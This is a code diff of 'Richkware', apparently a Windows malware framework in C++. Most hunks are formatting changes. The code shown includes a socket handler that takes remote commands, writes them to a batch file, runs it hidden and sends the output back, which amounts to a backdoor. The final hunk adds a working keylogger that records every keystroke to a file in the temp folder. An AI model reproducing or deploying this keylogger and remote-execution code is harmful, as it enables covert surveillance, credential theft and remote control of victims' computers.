@@ -52,10 +52,10 @@ void Richkware::RequestAdminPrivileges() {
 			sei.nShow = SW_NORMAL;
 
 			/*if (!ShellExecuteEx(&sei)) {
-				DWORD dwError = GetLastError();
-				//if (dwError == ERROR_CANCELLED)
-				//CreateThread(0, 0, (LPTHREAD_START_ROUTINE) RequestAdminPrivileges, 0, 0, 0);
-			}*/
+			 DWORD dwError = GetLastError();
+			 //if (dwError == ERROR_CANCELLED)
+			 //CreateThread(0, 0, (LPTHREAD_START_ROUTINE) RequestAdminPrivileges, 0, 0, 0);
+			 }*/
 		}
 
 	} else {
@@ -116,7 +116,7 @@ void Richkware::UnBlockApps() {
 
 DWORD WINAPI
 BlockAppsThread(void* arg) {
-	std::list<const char*>* dangApps = (std::list<const char*> *)arg;
+	std::list<const char*>* dangApps = (std::list<const char*> *) arg;
 	HWND app_heandler;
 
 	while (true) {
@@ -244,16 +244,16 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
 		command.append(recvbuf);
 		posSubStr = command.find("---");
-		if ( posSubStr != std::string::npos ) {
+		if (posSubStr != std::string::npos) {
 			// erase escape characters
 			command.erase(posSubStr);
 
 			std::string commandTmp = command;
 			commandTmp.append(" > ");
 			commandTmp.append(fileLog);
-			std::ofstream file (fileBat.c_str());
+			std::ofstream file(fileBat.c_str());
 
-			if (file.is_open()){
+			if (file.is_open()) {
 				for (std::string::iterator it = commandTmp.begin();
 						it != commandTmp.end(); ++it) {
 					file << *it;
@@ -261,22 +261,23 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 				file.close();
 			}
 
-			if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)){
+			if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)) {
 				// Response
 				command.append("  -->  ");
-				std::ifstream file (fileLog.c_str());
+				std::ifstream file(fileLog.c_str());
 				std::string s;
-				if (file.is_open()){
+				if (file.is_open()) {
 					while (!file.eof()) {
 						getline(file, s);
 						command.push_back('\n');
 						command.append(s);
 					}
 				}
-				iSendResult = send(ClientSocket, command.c_str(), (int)strlen(command.c_str()), 0);
+				iSendResult = send(ClientSocket, command.c_str(),
+						(int) strlen(command.c_str()), 0);
 				file.close();
 
-			}else{
+			} else {
 				iSendResult = send(ClientSocket, "error", 5, 0);
 			}
 			if (iSendResult == SOCKET_ERROR) {
@@ -293,7 +294,6 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 	// remove tmp files
 	remove(fileBat.c_str());
 	remove(fileLog.c_str());
-
 
 	// shutdown the connection
 	iResult = shutdown(ClientSocket, SD_SEND);
@@ -520,23 +520,41 @@ std::string Richkware::LoadValueReg(const char* path, const char* key) {
 	return value;
 }
 
-/*
- void
- Richkware::Keylogger(){
- char ch;
- int cha;
- FILE *fptr;
+void Richkware::Keylogger(const char* fileName) {
+	HANDLE hBlockAppsTh;
 
- while(1){
- if(kbhit()){
- ch = getch();
- cha = ch;
- fptr = fopen("KEYS.TXT","a+");
- fputc(ch,fptr);
- if(cha == 27){
- //return 0;
- }
- }
- }
- }
- */
+	hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void*) fileName, 0, 0);
+
+	WaitForSingleObject(hBlockAppsTh, INFINITE);
+	CloseHandle(hBlockAppsTh);
+}
+
+DWORD WINAPI
+KeyloggerThread(void* arg) {
+	const char* nomeFile = (const char*) arg;
+	char tmp_path[MAX_PATH];
+	GetTempPath(MAX_PATH, tmp_path);
+	std::string fileLog = tmp_path;
+	fileLog.append(nomeFile);
+	bool condSession = true;
+
+	while (true) {
+		std::ofstream file(fileLog.c_str(), std::ios::app);
+		if (file.is_open()) {
+			while (condSession) {
+				for (int i = 0; i < 256; i++) {
+					if (GetAsyncKeyState(i)) {
+						file << (char) i;
+						if (i == VK_RETURN || i == VK_LBUTTON) {
+							condSession = false;
+							break;
+						}
+					}
+				}
+				Sleep(100);
+			}
+		}
+		file.close();
+		condSession = true;
+	}
+}
